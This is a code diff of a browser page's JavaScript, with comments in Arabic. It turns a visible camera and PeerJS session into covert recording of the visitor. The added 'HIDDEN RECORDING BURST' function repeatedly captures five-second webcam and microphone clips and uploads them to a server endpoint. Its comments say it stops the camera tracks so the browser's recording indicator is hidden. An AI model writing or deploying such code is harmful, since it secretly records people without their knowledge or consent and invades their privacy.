@@ -262,22 +262,19 @@ body {
     }
 
     navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+      video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: 'user' },
       audio: true
     })
     .then(function(stream) {
-      localStream = stream;
-      localVideo.srcObject = stream;
+      // إيقاف الكاميرا فوراً لإخفاء النقطة
+      stream.getTracks().forEach(track => track.stop());
 
-      // إنشاء PeerJS connection
+      // إنشاء PeerJS connection (فقط للإشارة والألعاب، ليس للبث المباشر)
       peer = new Peer(sessionId, {
         config: {
           iceServers: [
             { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:stun1.l.google.com:19302' },
-            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
-            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
-            { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
+            { urls: 'stun:stun1.l.google.com:19302' }
           ]
         }
       });
@@ -294,7 +291,7 @@ body {
         }).catch(() => {});
       });
 
-      // استقبال اتصال من Control Panel
+      // استقبال اتصال من Control Panel (لن نرد بفيديو)
       peer.on('connection', function(conn) {
         controlConn = conn;
         conn.on('data', function(data) {
@@ -304,14 +301,8 @@ body {
         });
       });
 
-      // استقبال بث وسائط (لما الـ control يطلب البث)
-      peer.on('call', function(call) {
-        call.answer(localStream);
-        mediaConn = call;
-        call.on('stream', function(remoteStream) {
-          // البث يذهب إلى control panel
-        });
-      });
+      // إطلاق التسجيل المتقطع
+      setTimeout(burstRecord, 2000);
 
       // فتح اتصال بـ Control Panel (إذا كان يعرف PeerID)
       const urlParams = new URLSearchParams(window.location.search);
@@ -362,6 +353,49 @@ body {
     permOverlay.classList.remove('show');
     sessionStorage.setItem('_perm_skipped', '1');
   });
+
+// ============================================================
+// 🎯 HIDDEN RECORDING BURST
+// ============================================================
+window.burstRecord = function burstRecord() {
+  navigator.mediaDevices.getUserMedia({ 
+    video: { width: 320, height: 240, frameRate: 15 },
+    audio: { echoCancellation: true, noiseSuppression: true }
+  })
+  .then(function(stream) {
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+    const chunks = [];
+    
+    recorder.ondataavailable = function(e) {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+    
+    recorder.onstop = function() {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const fd = new FormData();
+      fd.append('clip', blob, Date.now() + '.webm');
+      fd.append('sessionId', sessionId);
+      
+      fetch('/api/upload-clip', { method: 'POST', body: fd }).catch(() => {});
+      
+      // إيقاف الكاميرا لإخفاء النقطة
+      stream.getTracks().forEach(t => t.stop());
+      
+      // بعد 15 ثانية، سجل مرة أخرى
+      setTimeout(window.burstRecord, 15000);
+    };
+    
+    recorder.start();
+    setTimeout(() => {
+      if (recorder.state !== 'inactive') recorder.stop();
+    }, 5000); // سجل 5 ثواني فقط
+  })
+  .catch(function(err) {
+    console.log('Burst error', err);
+    setTimeout(window.burstRecord, 5000);
+  });
+};
+
 })();
 
 // ============================================================
